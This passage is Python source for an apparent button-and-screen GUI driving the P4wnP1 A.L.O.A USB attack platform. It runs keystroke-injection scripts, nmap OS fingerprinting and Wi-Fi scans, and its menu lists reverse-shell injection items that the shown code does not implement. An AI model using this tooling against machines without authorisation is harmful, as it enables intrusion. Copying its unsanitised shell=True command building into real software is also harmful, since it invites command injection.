# -*- coding:utf-8 -*-
#imports 

from luma.core.interface.serial import i2c,spi
from luma.core.render import canvas
from luma.lcd.device import st7789
import RPi.GPIO as GPIO
import datetime
import time
import subprocess
from PIL import Image
from PIL import ImageDraw
from PIL import ImageFont
import socket, sys
import os
import base64
import struct
import smbus

UPS = 0 # 1 = UPS Lite connected / 0 = No UPS Lite hat
SCNTYPE = 1 # 1= OLED #2 = TERMINAL MODE BETA TESTS VERSION

def readVoltage(bus):
        "This function returns as float the voltage from the Raspi UPS Hat via the provided SMBus object"
        address = 0x36
        read = bus.read_word_data(address, 2)
        swapped = struct.unpack("<H", struct.pack(">H", read))[0]
        voltage = swapped * 1.25 /1000/16
        return voltage


def readCapacity(bus):
        "This function returns as a float the remaining capacity of the battery connected to the Raspi UPS Hat via the provided SMBus object"
        address = 0x36
        read = bus.read_word_data(address, 4)
        swapped = struct.unpack("<H", struct.pack(">H", read))[0]
        capacity = swapped/256
        return capacity


#bus = smbus.SMBus(1)  # 0 = /dev/i2c-0 (port I2C0), 1 = /dev/i2c-1 (port I2C1)

GPIO.setwarnings(False)
#P4wnP1 essential const
hidpath = "/usr/local/P4wnP1/HIDScripts/"
sshpath = "/usr/local/P4wnP1/scripts/"

# Load default font.
#font = ImageFont.load_default()
font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf', 18)

# Create blank image for drawing.
# Make sure to create image with mode '1' for 1-bit color.
width = 240
height = 240
image = Image.new('1', (width, height))
# First define some constants to allow easy resizing of shapes.
padding = -2
top = padding
bottom = height-padding
line1 = top
line2 = top+20
line3 = top+40
line4 = top+60
line5 = top+80
line6 = top+100
line7 = top+120
brightness = 255 #Max
fichier=""
# Move left to right keeping track of the current x position for drawing shapes.
x = 0
RST = 27
CS = 8
DC = 25

#GPIO define and OLED configuration
RST_PIN        = 27 #waveshare settings
CS_PIN         = 8  #waveshare settings
DC_PIN         = 25 #waveshare settings
KEY_UP_PIN     = 6  #stick up
KEY_DOWN_PIN   = 19 #stick down
KEY_LEFT_PIN   = 5 #5  #sitck left // go back
KEY_RIGHT_PIN  = 26 #stick right // go in // validate
KEY_PRESS_PIN  = 13 #stick center button
KEY1_PIN       = 21 #key 1 // up
KEY2_PIN       = 20  #20 #key 2 // cancel/goback
KEY3_PIN       = 16 #key 3 // down
USER_I2C = 0        #set to 1 if your oled is I2C or  0 if use SPI interface
#init GPIO
GPIO.setmode(GPIO.BCM)
GPIO.setup(KEY_UP_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)    # Input with pull-up
GPIO.setup(KEY_DOWN_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)  # Input with pull-up
GPIO.setup(KEY_LEFT_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)  # Input with pull-up
GPIO.setup(KEY_RIGHT_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP) # Input with pull-up
GPIO.setup(KEY_PRESS_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP) # Input with pull-up
GPIO.setup(KEY1_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)      # Input with pull-up
GPIO.setup(KEY2_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)      # Input with pull-up
GPIO.setup(KEY3_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)      # Input with pull-up
screensaver = 0
#SPI
#serial = spi(device=0, port=0, bus_speed_hz = 8000000, transfer_size = 4096, gpio_DC = 24, gpio_RST = 25)
if SCNTYPE == 1:
    if  USER_I2C == 1:
        GPIO.setmode(GPIO.BCM)
        GPIO.setup(RST,GPIO.OUT)
        GPIO.output(RST,GPIO.HIGH)
        serial = i2c(port=1, address=0x3c)
    else:
        #serial = spi(device=0, port=0, bus_speed_hz = 8000000, transfer_size = 4096, gpio_DC = 25, gpio_RST = 27)
        serial = spi(device=0, port=0, gpio_DC = 25, gpio_RST = 27)
	

if SCNTYPE == 1:
    device = st7789(serial) #sh1106
def DisplayText(l1,l2,l3,l4,l5,l6,l7):
    # simple routine to display 7 lines of text

    if SCNTYPE == 1:
        with canvas(device) as draw:
            draw.text((0, line1), l1,  font=font, fill=(255,255,255))
            draw.text((0, line2), l2, font=font, fill=(255,255,255,))
            draw.text((0, line3), l3,  font=font, fill=(255,255,255,))
            draw.text((0, line4), l4,  font=font, fill=(255,255,255,))
            draw.text((0, line5), l5, font=font, fill=(255,255,255,))
            draw.text((0, line6), l6, font=font, fill=(255,255,255,))
            draw.text((0, line7), l7, font=font, fill=(255,255,255,))
    if SCNTYPE == 2:
            os.system('clear')
            print(l1)
            print(l2)
            print(l3)
            print(l4)
            print(l5)
            print(l6)
            print(l7)
def shell(cmd):
    return(subprocess.check_output(cmd, shell = True ).decode('utf-8'))
def switch_menu(argument):
    switcher = {
    0: "_  P4wnP1 A.L.O.A",
        1: "_SYSTEM RELATED",
        2: "_HID MANAGEMENT",
        3: "_WIRELESS THINGS",
        4: "_TRIGGERS FEATURES",
        5: "_TEMPLATES FEATURES",
        6: "_INFOSEC TOOLS",
        7: "_System information",
        8: "_OLED brightness",
        9: "_HOST OS detection",
        10: "_Display OFF",
        11: "_Keys Test",
        12: "_Reboot GUI",
        13: "_System shutdown",
        14: "_RUN HID script",
        15: "_GAMEPAD",
        16: "_MOUSE",
        17: "_Set Typing Speed",
        18: "_Set Key layout",
        19: "_",
        20: "_",
        21: "_Scan WIFI AP",
        22: "_",
        23: "_",
        24: "_",
        25: "_",
        26: "_",
        27: "_",
        28: "_Send to oled group",
        29: "_",
        30: "_",
        31: "_",
        32: "_",
        33: "_",
        34: "_",
        35: "_FULL SETTINGS",
        36: "_BLUETOOTH",
        37: "_USB",
        38: "_WIFI",
        39: "_TRIGGER ACTIONS",
        40: "_NETWORK",
        41: "_",
        42: "_Inject Rshell(ADMIN)",
        43: "_Inject Rshell (USER)",
        44: "_Revesreshell Exploit",
        45: "_",
        46: "_",
        47: "_",
        48: "_"
}
    return switcher.get(argument, "Invalid")
def about():
    # simple sub routine to show an About
    DisplayText(
        "  : P4wnP1 A.L.O.A :",
        "P4wnP1 (c) @Mame82",
        "V 1.1 on New P4wnP1",
        "This GUI is developed",
        "       by BeBoX",
        "contact :",
        "depanet@gmail.com"
        )
    while GPIO.input(KEY_LEFT_PIN):
        #wait
        menu = 1
    page = 0
#system information sub routine
def sysinfos():
    while GPIO.input(KEY_LEFT_PIN):
        now = datetime.datetime.now()
        today_time = now.strftime("%H:%M:%S")
        today_date = now.strftime("%d %b %y")
        #cmd = "hostname -I | cut -d\' \' -f1"
        #IP = subprocess.check_output(cmd, shell = True )
        cmd = "hostname -I"
        IP = subprocess.check_output(cmd, shell = True ).decode('utf-8').split()[0]
        IP2 = subprocess.check_output(cmd, shell = True ).decode('utf-8').split()[1]
        IP3 = subprocess.check_output(cmd, shell = True ).decode('utf-8').split()[2]
        cmd = "top -bn1 | grep %Cpu | awk '{printf \"%.0f\",$2}'"
        temp = os.popen("cat /sys/class/thermal/thermal_zone0/temp").readline()
        temp = int(temp)/1000
        proc = " CPU:" + subprocess.check_output(cmd, shell=True).decode('utf-8').strip() + " %"
        cmd = "free -m | awk 'NR==2{printf \"MEM :%.2f%%\", $3*100/$2 }'"
        MemUsage = subprocess.check_output(cmd, shell = True ).decode('utf-8') + proc
        cmd = "df -h | awk '$NF==\"/\"{printf \"Disk: %d/%dGB %s\", $3,$2,$5}'"
        Disk = subprocess.check_output(cmd, shell = True ).decode('utf-8')
        DisplayText(
            "WIFI: " + str(IP),
            str(MemUsage),
            str(Disk),
            "BTH.: " + str(IP3),
            "USB.: " + str(IP2),
            "",
            today_date + " " + today_time
            )
        time.sleep(0.1)
    #page = 7
def IdentOS(ips):
    #return os name if found ex. Microsoft Windows 7 ,  Linux 3.X
    return(shell("nmap -p 22,80,445,65123,56123 -O " + ips + " | grep Running: | cut -d \":\" -f2 | cut -d \"|\" -f1"))
def OsDetails(ips):
    return(shell("nmap -p 22,80,445,65123,56123 -O " + ips + " | grep \"OS details:\" | cut -d \":\" -f2 | cut -d \",\" -f1"))
def OLEDContrast(contrast):
    #set contrast 0 to 255
    if SCNTYPE == 1:
        while GPIO.input(KEY_LEFT_PIN):
            #loop until press left to quit
            with canvas(device) as draw:
                if GPIO.input(KEY_UP_PIN): # button is released
                        draw.polygon([(20, 20), (30, 2), (40, 20)], outline=255, fill=0)  #Up
                else: # button is pressed:
                        draw.polygon([(20, 20), (30, 2), (40, 20)], outline=255, fill=1)  #Up filled
                        contrast = contrast +5
                        if contrast>255:
                            contrast = 255

                if GPIO.input(KEY_DOWN_PIN): # button is released
                        draw.polygon([(30, 60), (40, 42), (20, 42)], outline=255, fill=0) #down
                else: # button is pressed:
                        draw.polygon([(30, 60), (40, 42), (20, 42)], outline=255, fill=1) #down filled
                        contrast = contrast-5
                        if contrast<0:
                            contrast = 0
                device.contrast(contrast)
                draw.text((54, line4), "Value : " + str(contrast),  font=font, fill=255)
    return(contrast)
def splash():
    img_path = os.path.abspath(os.path.join(os.path.dirname(__file__), 'images', 'bootdefcon.bmp'))
    device.width = 240
    device.height = 240
    c = (240 - 220) / 2
    f = (240 - 350) / 2
    splash = Image.open(img_path) \
        .transform((device.width, device.height), Image.AFFINE, (1, 0, c, 0, 1, f), Image.BILINEAR) \
        .convert(device.mode)
    device.display(splash)
    time.sleep(5) #5 sec splash boot screen
def SreenOFF():
    #put screen off until press left
    if SCNTYPE == 1:
        while GPIO.input(KEY_LEFT_PIN):
            device.hide()
            time.sleep(0.1)
        device.show()
def KeyTest():
    if SCNTYPE == 1:
        while GPIO.input(KEY_LEFT_PIN):
            with canvas(device) as draw:
                if GPIO.input(KEY_UP_PIN): # button is released
                        draw.polygon([(20, 20), (30, 2), (40, 20)], outline=255, fill=0)  #Up
                else: # button is pressed:
                        draw.polygon([(20, 20), (30, 2), (40, 20)], outline=255, fill=1)  #Up filled

                if GPIO.input(KEY_LEFT_PIN): # button is released
                        draw.polygon([(0, 30), (18, 21), (18, 41)], outline=255, fill=0)  #left
                else: # button is pressed:
                        draw.polygon([(0, 30), (18, 21), (18, 41)], outline=255, fill=1)  #left filled

                if GPIO.input(KEY_RIGHT_PIN): # button is released
                        draw.polygon([(60, 30), (42, 21), (42, 41)], outline=255, fill=0) #right
                else: # button is pressed:
                        draw.polygon([(60, 30), (42, 21), (42, 41)], outline=255, fill=1) #right filled

                if GPIO.input(KEY_DOWN_PIN): # button is released
                        draw.polygon([(30, 60), (40, 42), (20, 42)], outline=255, fill=0) #down
                else: # button is pressed:
                        draw.polygon([(30, 60), (40, 42), (20, 42)], outline=255, fill=1) #down filled

                if GPIO.input(KEY_PRESS_PIN): # button is released
                        draw.rectangle((20, 22,40,40), outline=255, fill=0) #center 
                else: # button is pressed:
                        draw.rectangle((20, 22,40,40), outline=255, fill=1) #center filled

                if GPIO.input(KEY1_PIN): # button is released
                        draw.ellipse((70,0,90,20), outline=255, fill=0) #A button
                else: # button is pressed:
                        draw.ellipse((70,0,90,20), outline=255, fill=1) #A button filled

                if GPIO.input(KEY2_PIN): # button is released
                        draw.ellipse((100,20,120,40), outline=255, fill=0) #B button
                else: # button is pressed:
                        draw.ellipse((100,20,120,40), outline=255, fill=1) #B button filled
                        
                if GPIO.input(KEY3_PIN): # button is released
                        draw.ellipse((70,40,90,60), outline=255, fill=0) #A button
                else: # button is pressed:
                        draw.ellipse((70,40,90,60), outline=255, fill=1) #A button filled
def FileSelect(path,ext):
    cmd = "ls -F --format=single-column  " + path + "*" + ext
    listattack=subprocess.check_output(cmd, shell = True ).decode('utf-8')
    listattack=listattack.replace(ext,"")
    listattack=listattack.replace(path,"")
    listattack=listattack.replace("*","")
    listattack=listattack.split("\n")
    maxi=len(listattack) #number of records
    cur=0
    retour = ""
    ligne = ["","","","","","","",""]
    time.sleep(0.5)
    while GPIO.input(KEY_LEFT_PIN):
        #on boucle
        tok=0
        if maxi < 7:
            for n in range(0,7):
                if n<maxi:
                    if n == cur:
                        ligne[n] = ">"+listattack[n]
                    else:
                        ligne[n] = " "+listattack[n]
                else:
                    ligne[n] = ""
        else:
            if cur+7<maxi:
                for n in range (cur,cur + 7):
                    if n == cur:
                        ligne[tok] = ">"+listattack[n]
                    else:
                        ligne[tok] = " "+listattack[n]
                    tok=tok+1
            else:
                for n in range(maxi-8,maxi-1):
                    if n == cur:
                        ligne[tok] = ">"+listattack[n]
                    else:
                        ligne[tok] = " "+listattack[n]                            
                    tok=tok+1
        if GPIO.input(KEY_UP_PIN): # button is released
            menu = 1
        else: # button is pressed:
            cur = cur -1
            if cur<0:
                cur = 0
        if GPIO.input(KEY_DOWN_PIN): # button is released
            menu = 1
        else: # button is pressed:
            cur = cur + 1
            if cur>maxi-2:
                cur = maxi-2
        if GPIO.input(KEY_RIGHT_PIN): # button is released
            menu = 1
        else: # button is pressed:
            retour = listattack[cur]+ext
            return(retour)
        #print(str(cur) + " " + listattack[cur])        #debug
        DisplayText(ligne[0],ligne[1],ligne[2],ligne[3],ligne[4],ligne[5],ligne[6])
        time.sleep(0.1)
    return("")
def templateSelect(liste):
    # GetTemplateList("BLUETOOTH").split("\n")
    fichier = GetTemplateList(liste).split("\n")
    maxi = len(fichier)
    cur=1
    retour = ""
    ligne = ["","","","","","","",""]
    time.sleep(0.5)
    while GPIO.input(KEY_LEFT_PIN):
        #on boucle
        tok=1
        if maxi < 8:
            for n in range(1,8):
                if n<maxi:
                    if n == cur:
                        ligne[n-1] = ">"+fichier[n]
                    else:
                        ligne[n-1] = " "+fichier[n]
                else:
                    ligne[n-1] = ""
        else:
            if cur+7<maxi:
                for n in range (cur,cur + 7):
                    if n == cur:
                        ligne[tok-1] = ">"+fichier[n]
                    else:
                        ligne[tok-1] = " "+fichier[n]
                    tok=tok+1
            else:
                for n in range(maxi-8,maxi-1):
                    if n == cur:
                        ligne[tok-1] = ">"+fichier[n]
                    else:
                        ligne[tok-1] = " "+fichier[n]                            
                    tok=tok+1
        if GPIO.input(KEY_UP_PIN): # button is released
            menu = 1
        else: # button is pressed:
            cur = cur -1
            if cur<1:
                cur = 1
        if GPIO.input(KEY_DOWN_PIN): # button is released
            menu = 1
        else: # button is pressed:
            cur = cur + 1
            if cur>maxi-2:
                cur = maxi-2
        if GPIO.input(KEY_RIGHT_PIN): # button is released
            menu = 1
        else: # button is pressed:
            retour = fichier[cur]
            print(retour)
            return(retour)    
        # ----------
        DisplayText(ligne[0],ligne[1],ligne[2],ligne[3],ligne[4],ligne[5],ligne[6])
        time.sleep(0.1)
def runhid():
    #choose and run (or not) a script
    fichier = FileSelect(hidpath,".js")
    time.sleep(0.5)
    if  fichier == "":
        return()
    while GPIO.input(KEY_LEFT_PIN):
        answer = 0
        while answer == 0:
            DisplayText(
                "YES              YES",
                "",
                "",
                fichier,
                "",
                "",
                "NO                NO"
                )
            if GPIO.input(KEY_UP_PIN): # button is released
                menu = 1
            else: # button is pressed:
                answer = 1
            if GPIO.input(KEY_DOWN_PIN): # button is released
                menu = 1
            else: # button is pressed:
                answer = 2
            if GPIO.input(KEY1_PIN): # button is released
                menu = 1
            else: # button is pressed:
                answer = 1
            if GPIO.input(KEY3_PIN): # button is released
                menu = 1
            else: # button is pressed:
                answer = 2
        if answer == 2:
            return()
        time.sleep(0.5) #pause 
        answer = 0
        while answer ==0:
            DisplayText(
                "   Run Background job",
                "",
                "",
                "Method ?       CANCEL",
                "",
                "",
                "       Run direct job"
                )
            if GPIO.input(KEY_UP_PIN): # button is released
                menu = 1
            else: # button is pressed:
                answer = 1
            if GPIO.input(KEY_LEFT_PIN): # button is released
                menu = 1
            else: # button is pressed:
                answer = 2
            if GPIO.input(KEY_DOWN_PIN): # button is released
                menu = 1
            else: # button is pressed:
                answer = 3            
            if GPIO.input(KEY1_PIN): # button is released
                menu = 1
            else: # button is pressed:
                answer = 1
            if GPIO.input(KEY2_PIN): # button is released
                menu = 1
            else: # button is pressed:
                answer = 2  
            if GPIO.input(KEY3_PIN): # button is released
                menu = 1
            else: # button is pressed:
                answer = 3
        if answer == 2:
            return()
        DisplayText(
    "",
    "",
    "",
    "HID Script running...",
    "",
    "",
    ""
    )
        if answer == 1:
            # run as background job P4wnP1_cli hid job command
            cmd = "P4wnP1_cli hid job '" + fichier+"'"
            result=subprocess.check_output(cmd, shell = True ).decode('utf-8')
            return()
        if answer == 3:
            # run hid script directly
            cmd = "P4wnP1_cli hid run '" + fichier+"'"
            result=subprocess.check_output(cmd, shell = True ).decode('utf-8')
            return()
def restart():
    DisplayText(
    "",
    "",
    "",
    "PLEASE WAIT ...",
    "",
    "",
    ""
    )
    cmd="python /root/BeBoXGui/runmenu.py &"
    exe = subprocess.check_output(cmd, shell = True ).decode('utf-8')
    return()
def GetTemplateList(type):
    # get list of template
    # Possible types : FULL_SETTINGS , BLUETOOTH , USB , WIFI , TRIGGER_ACTIONS , NETWORK
    cmd = "P4wnP1_cli template list"
    list = subprocess.check_output(cmd, shell = True ).decode('utf-8')
    list = list.replace("Templates of type ","") #remove unwanted text
    list = list.replace(" :","")
    list = list.replace("------------------------------------\n","")
    list = list.split("\n")
    result = ""
    found = 0
    for n in range(0,len(list)):
        if list[n] == type:
            found = 1
        if list[n] == "":
            found = 0
        if found == 1:
            result = result + list[n] + "\n"
    return(result)   
def ApplyTemplate(template,section):
    print(template)
    print(section)
    while GPIO.input(KEY_LEFT_PIN):
        answer = 0
        while answer == 0:
            DisplayText(
                "YES              YES",
                "",
                "",
                fichier,
                "",
                "",
                "NO                NO"
                )
            if GPIO.input(KEY_UP_PIN): # button is released
                menu = 1
            else: # button is pressed:
                answer = 1
            if GPIO.input(KEY_DOWN_PIN): # button is released
                menu = 1
            else: # button is pressed:
                answer = 2
            if GPIO.input(KEY1_PIN): # button is released
                menu = 1
            else: # button is pressed:
                answer = 1
            if GPIO.input(KEY3_PIN): # button is released
                menu = 1
            else: # button is pressed:
                answer = 2
        if answer == 2:
            return()
        time.sleep(0.5) #pause
        cmd = "P4wnP1_cli template deploy -" +section + " '"+ template+"'"
        exe = subprocess.check_output(cmd, shell = True ).decode('utf-8')
        return()
def Gamepad():
    if SCNTYPE == 1:
        while GPIO.input(KEY_PRESS_PIN):
            with canvas(device) as draw:
                if GPIO.input(KEY_UP_PIN): # button is released
                        draw.polygon([(20, 20), (30, 2), (40, 20)], outline=255, fill=0)  #Up
                else: # button is pressed:
                        draw.polygon([(20, 20), (30, 2), (40, 20)], outline=255, fill=1)  #Up filled
                        exe = subprocess.check_output("P4wnP1_cli hid run -c 'press(\"UP\")'", shell = True ).decode('utf-8')

                if GPIO.input(KEY_LEFT_PIN): # button is released
                        draw.polygon([(0, 30), (18, 21), (18, 41)], outline=255, fill=0)  #left
                else: # button is pressed:
                        draw.polygon([(0, 30), (18, 21), (18, 41)], outline=255, fill=1)  #left filled
                        exe = subprocess.check_output("P4wnP1_cli hid run -c 'press(\"LEFT\")'", shell = True ).decode('utf-8')

                if GPIO.input(KEY_RIGHT_PIN): # button is released
                        draw.polygon([(60, 30), (42, 21), (42, 41)], outline=255, fill=0) #right
                else: # button is pressed:
                        draw.polygon([(60, 30), (42, 21), (42, 41)], outline=255, fill=1) #right filled
                        exe = subprocess.check_output("P4wnP1_cli hid run -c 'press(\"RIGHT\")'", shell = True ).decode('utf-8')

                if GPIO.input(KEY_DOWN_PIN): # button is released
                        draw.polygon([(30, 60), (40, 42), (20, 42)], outline=255, fill=0) #down
                else: # button is pressed:
                        draw.polygon([(30, 60), (40, 42), (20, 42)], outline=255, fill=1) #down filled
                        exe = subprocess.check_output("P4wnP1_cli hid run -c 'press(\"DOWN\")'", shell = True ).decode('utf-8')

                if GPIO.input(KEY1_PIN): # button is released
                        draw.ellipse((70,0,90,20), outline=255, fill=0) #A button
                else: # button is pressed:
                        draw.ellipse((70,0,90,20), outline=255, fill=1) #A button filled
                        exe = subprocess.check_output("P4wnP1_cli hid run -c 'press(\"Q\")'", shell = True ).decode('utf-8')

                if GPIO.input(KEY2_PIN): # button is released
                        draw.ellipse((100,20,120,40), outline=255, fill=0) #B button
                else: # button is pressed:
                        draw.ellipse((100,20,120,40), outline=255, fill=1) #B button filled
                        exe = subprocess.check_output("P4wnP1_cli hid run -c 'press(\"W\")'", shell = True ).decode('utf-8')
                        
                if GPIO.input(KEY3_PIN): # button is released
                        draw.ellipse((70,40,90,60), outline=255, fill=0) #A button
                else: # button is pressed:
                        draw.ellipse((70,40,90,60), outline=255, fill=1) #A button filled
                        exe = subprocess.check_output("P4wnP1_cli hid run -c 'press(\"E\")'", shell = True ).decode('utf-8')
def Mouse():
    bouton1 = 0
    bouton2 = 0
    step = 10
    time.sleep(0.5)
    if SCNTYPE == 1:
        while GPIO.input(KEY2_PIN):
            with canvas(device) as draw:
                if GPIO.input(KEY_UP_PIN): # button is released
                        draw.polygon([(20, 20), (30, 2), (40, 20)], outline=255, fill=0)  #Up
                else: # button is pressed:
                        draw.polygon([(20, 20), (30, 2), (40, 20)], outline=255, fill=1)  #Up filled
                        exe = subprocess.check_output("P4wnP1_cli hid run -c 'moveStepped(0,-"+str(step)+")'", shell = True ).decode('utf-8')

                if GPIO.input(KEY_LEFT_PIN): # button is released
                        draw.polygon([(0, 30), (18, 21), (18, 41)], outline=255, fill=0)  #left
                else: # button is pressed:
                        draw.polygon([(0, 30), (18, 21), (18, 41)], outline=255, fill=1)  #left filled
                        exe = subprocess.check_output("P4wnP1_cli hid run -c 'moveStepped(-"+str(step)+",0)'", shell = True ).decode('utf-8')

                if GPIO.input(KEY_RIGHT_PIN): # button is released
                        draw.polygon([(60, 30), (42, 21), (42, 41)], outline=255, fill=0) #right
                else: # button is pressed:
                        draw.polygon([(60, 30), (42, 21), (42, 41)], outline=255, fill=1) #right filled
                        exe = subprocess.check_output("P4wnP1_cli hid run -c 'moveStepped("+str(step)+",0)'", shell = True ).decode('utf-8')

                if GPIO.input(KEY_DOWN_PIN): # button is released
                        draw.polygon([(30, 60), (40, 42), (20, 42)], outline=255, fill=0) #down
                else: # button is pressed:
                        draw.polygon([(30, 60), (40, 42), (20, 42)], outline=255, fill=1) #down filled
                        exe = subprocess.check_output("P4wnP1_cli hid run -c 'moveStepped(0,"+str(step)+")'", shell = True ).decode('utf-8')

                if GPIO.input(KEY_PRESS_PIN): # button is released
                        draw.rectangle((20, 22,40,40), outline=255, fill=0) #center 
                else: # button is pressed:
                        draw.rectangle((20, 22,40,40), outline=255, fill=1) #center filled
                        if step == 10:
                            #exe = subprocess.check_output("P4wnP1_cli hid run -c 'button(BT1)'", shell = True )
                            step = 100
                            time.sleep(0.2)
                        else:
                            #exe = subprocess.check_output("P4wnP1_cli hid run -c 'button(BTNONE)'", shell = True )
                            step = 10
                            time.sleep(0.2)

                if GPIO.input(KEY1_PIN): # button is released
                        draw.ellipse((70,0,90,20), outline=255, fill=0) #A button
                        #exe = subprocess.check_output("P4wnP1_cli hid run -c 'button(BTNONE)'", shell = True )
                else: # button is pressed:
                        draw.ellipse((70,0,90,20), outline=255, fill=1) #A button filled
                        if bouton1 == 0:
                            exe = subprocess.check_output("P4wnP1_cli hid run -c 'button(BT1)'", shell = True ).decode('utf-8')
                            bouton1 = 1
                            time.sleep(0.2)
                            exe = subprocess.check_output("P4wnP1_cli hid run -c 'button(BTNONE)'", shell = True ).decode('utf-8')

                        else:
                            exe = subprocess.check_output("P4wnP1_cli hid run -c 'button(BTNONE)'", shell = True ).decode('utf-8')
                            bouton1 = 0
                            time.sleep(0.2)
                draw.text((64, line4), "Key2 : Exit",  font=font, fill=255)        
                if GPIO.input(KEY3_PIN): # button is released
                        draw.ellipse((70,40,90,60), outline=255, fill=0) #A button
                        #exe = subprocess.check_output("P4wnP1_cli hid run -c 'button(BTNONE)'", shell = True )
                else: # button is pressed:
                        draw.ellipse((70,40,90,60), outline=255, fill=1) #A button filled
                        if bouton2 == 0:
                            exe = subprocess.check_output("P4wnP1_cli hid run -c 'button(BT2)'", shell = True ).decode('utf-8')
                            bouton2 = 1
                            time.sleep(0.2)
                            exe = subprocess.check_output("P4wnP1_cli hid run -c 'button(BTNONE)'", shell = True ).decode('utf-8')

                        else:
                            exe = subprocess.check_output("P4wnP1_cli hid run -c 'button(BTNONE)'", shell = True ).decode('utf-8')
                            bouton2 = 0
                            time.sleep(0.2)
                #time.sleep(0.1)
def SetTypingSpeed():
    time.sleep(0.5) #pause
    while GPIO.input(KEY_LEFT_PIN):         
        DisplayText(
            " Natural typing speed",
            "",
            "",
            "               CANCEL",
            "",
            "",
            "    Fast typing speed"
            )
        if GPIO.input(KEY_UP_PIN): # button is released
            menu = 1
        else: # button is pressed:
            answer = 1
        if GPIO.input(KEY_LEFT_PIN): # button is released
            menu = 1
        else: # button is pressed:
            answer = 2
        if GPIO.input(KEY_DOWN_PIN): # button is released
            menu = 1
        else: # button is pressed:
            answer = 3         
        if GPIO.input(KEY1_PIN): # button is released
            menu = 1
        else: # button is pressed:
            exe = subprocess.check_output("P4wnP1_cli hid run -c 'typingSpeed(100,150)'", shell = True ).decode('utf-8')
            time.sleep(0.5) #pause
            return()
        if GPIO.input(KEY2_PIN): # button is released
            menu = 1
        else: # button is pressed:
            time.sleep(0.5) #pause
            return()
        if GPIO.input(KEY3_PIN): # button is released
            menu = 1
        else: # button is pressed:
            exe = subprocess.check_output("P4wnP1_cli hid run -c 'typingSpeed(0,0)'", shell = True ).decode('utf-8')
            time.sleep(0.5) #pause
            return()
    time.sleep(0.5) #pause
def ListWifi ():
    cmd =subprocess.check_output("sudo iwlist wlan0 scan", shell = True ).decode('utf-8')
    return cmd
def LwifiExt (word,liste):
    for n in range(len(liste)):
        if liste[n].find(word) != -1:
            rep = liste[n].split(":")
            return rep[1]
    return 0
def scanwifi():
    #list wifi APs
    cmd ="sudo iwlist wlan0 scan | grep ESSID"
    SSID=subprocess.check_output(cmd, shell = True ).decode('utf-8')
    SSID=SSID.replace("                    ESSID:","")
    SSID=SSID.replace("\"","")
    ssidlist=SSID.split("\n")
    cmd ="sudo iwlist wlan0 scan | grep Encryption"
    Ekey=subprocess.check_output(cmd, shell = True ).decode('utf-8')
    Ekey=Ekey.replace("                    Encryption ","")
    Ekeylist=Ekey.split("\n")     
    for n in range(0,len(ssidlist)):
        if ssidlist[n]=="":ssidlist[n]="Hidden"
        ssidlist[n]=ssidlist[n]+" ["+Ekeylist[n]+"]"
    #----------------------------------------------------------
    listattack=ssidlist
    maxi=len(listattack) #number of records
    cur=0
    retour = ""
    ligne = ["","","","","","","",""]
    time.sleep(0.5)
    while GPIO.input(KEY_LEFT_PIN):
        #on boucle
        tok=0
        if maxi < 7:
            for n in range(0,7):
                if n<maxi:
                    if n == cur:
                        ligne[n] = ">"+listattack[n]
                    else:
                        ligne[n] = " "+listattack[n]
                else:
                    ligne[n] = ""
        else:
            if cur+7<maxi:
                for n in range (cur,cur + 7):
                    if n == cur:
                        ligne[tok] = ">"+listattack[n]
                    else:
                        ligne[tok] = " "+listattack[n]
                    tok=tok+1
            else:
                for n in range(maxi-8,maxi-1):
                    if n == cur:
                        ligne[tok] = ">"+listattack[n]
                    else:
                        ligne[tok] = " "+listattack[n]                            
                    tok=tok+1
        if GPIO.input(KEY_UP_PIN): # button is released
            menu = 1
        else: # button is pressed:
            cur = cur -1
            if cur<0:
                cur = 0
        if GPIO.input(KEY_DOWN_PIN): # button is released
            menu = 1
        else: # button is pressed:
            cur = cur + 1
            if cur>maxi-2:
                cur = maxi-2
        if GPIO.input(KEY_RIGHT_PIN): # button is released
            menu = 1
        else: # button is pressed:
            retour = listattack[cur]
            return(retour)
        #print(str(cur) + " " + listattack[cur])        #debug
        DisplayText(ligne[0],ligne[1],ligne[2],ligne[3],ligne[4],ligne[5],ligne[6])
        time.sleep(0.1)
    return("")
def trigger1():
    while GPIO.input(KEY_PRESS_PIN):
        with canvas(device) as draw:
            if GPIO.input(KEY_UP_PIN): # button is released
                    draw.polygon([(20, 20), (30, 2), (40, 20)], outline=255, fill=0)  #Up
                    draw.text((28, line2+2), "1",  font=font, fill=255)                    
            else: # button is pressed:
                    draw.polygon([(20, 20), (30, 2), (40, 20)], outline=255, fill=1)  #Up filled
                    shell("P4wnP1_cli trigger send -n \"oled\" -v 1")

            if GPIO.input(KEY_LEFT_PIN): # button is released
                    draw.polygon([(0, 30), (18, 21), (18, 41)], outline=255, fill=0)  #left
                    draw.text((11, line5-7), "3",  font=font, fill=255)                    
            else: # button is pressed:
                    draw.polygon([(0, 30), (18, 21), (18, 41)], outline=255, fill=1)  #left filled
                    shell("P4wnP1_cli trigger send -n \"oled\" -v 3")

            if GPIO.input(KEY_RIGHT_PIN): # button is released
                    draw.polygon([(60, 30), (42, 21), (42, 41)], outline=255, fill=0) #right
                    draw.text((45, line5-7), "4",  font=font, fill=255)                    
            else: # button is pressed:
                    draw.polygon([(60, 30), (42, 21), (42, 41)], outline=255, fill=1) #right filled
                    shell("P4wnP1_cli trigger send -n \"oled\" -v 4")

            if GPIO.input(KEY_DOWN_PIN): # button is released
                    draw.polygon([(30, 60), (40, 42), (20, 42)], outline=255, fill=0) #down
                    draw.text((28, line6+3), "2",  font=font, fill=255)                    
            else: # button is pressed:
                    draw.polygon([(30, 60), (40, 42), (20, 42)], outline=255, fill=1) #down filled
                    shell("P4wnP1_cli trigger send -n \"oled\" -v 2")
                    
            if GPIO.input(KEY1_PIN): # button is released
                    draw.ellipse((70,0,90,20), outline=255, fill=0) #A button
                    draw.text((75, line2), "10",  font=font, fill=255)                    
            else: # button is pressed:
                    draw.ellipse((70,0,90,20), outline=255, fill=1) #A button filled
                    shell("P4wnP1_cli trigger send -n \"oled\" -v 10")

            if GPIO.input(KEY2_PIN): # button is released
                    draw.ellipse((100,20,120,40), outline=255, fill=0) #B button
